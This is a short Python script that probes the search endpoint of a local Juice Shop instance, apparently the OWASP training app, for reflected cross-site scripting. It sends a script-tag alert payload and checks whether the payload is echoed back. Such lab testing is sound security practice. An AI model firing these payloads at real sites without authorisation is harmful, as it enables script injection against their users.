import requests

# Target: Juice Shop search endpoint
TARGET = "http://localhost:3000/rest/products/search?q="
PAYLOAD = "<script>alert('xss')</script>"

response = requests.get(TARGET + PAYLOAD)

if PAYLOAD in response.text:
    print("[!] Potential XSS vulnerability detected: Payload reflected in response.")
else:
    print("[*] No XSS found (payload not reflected).")
